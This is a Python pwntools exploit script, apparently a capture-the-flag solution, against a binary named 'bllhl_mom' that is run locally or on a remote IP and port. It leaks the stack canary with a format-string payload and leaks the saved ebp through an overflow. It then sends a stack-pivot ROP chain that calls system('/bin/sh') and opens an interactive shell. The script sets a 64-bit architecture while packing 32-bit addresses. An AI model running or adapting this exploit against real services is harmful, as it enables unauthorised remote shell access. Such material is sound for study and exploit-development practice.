from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./bllhl_mom"
libc_path = "./libc.so.6"

elf, rop = ELF(vuln_path), ROP(vuln_path)
# libc, roplibc = ELF(libc_path), ROP(libc_path)

if not f_remote:
    io = process([vuln_path])
    # io = process([ld_path, vuln_path], env={"LD_PRELOAD": libc_path})
else:
    io = remote("1.95.36.136", 2107)


def ddebug(b=""):
    if not f_gdb:
        return

    gdb.attach(io, gdbscript=b)
    pause()

# u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))


system=0x08048490
payload = b"%23$p"
io.sendafter("to Mom", payload)
can=int(io.recvn(10), 16)
log.success("canarry:-----> " + hex(can))

payload=(0x50-8)*b"t"+b"f"*8
io.send(payload)
io.recvuntil("f"*8, drop=True)
d=io.recv(8)
log.hexdump(d)
# log.success("ebp:-----> " + hex(ebp))
ebp=u32(d[0:4])
log.success("ebp:-----> "+hex(ebp))

leave_ret = 0x0804861f 
ret = 0x0804840e 

payload = p32(0)
payload += p32(system)
payload += p32(0)
payload += p32(ebp-0x50)
payload += b"/bin/sh\x00"

payload = payload.ljust(0x50-12, b"a")
payload += p32(can)+p32(0)*2 + p32(ebp-0x60) +p32(leave_ret)
ddebug()
io.send(payload)


io.interactive()




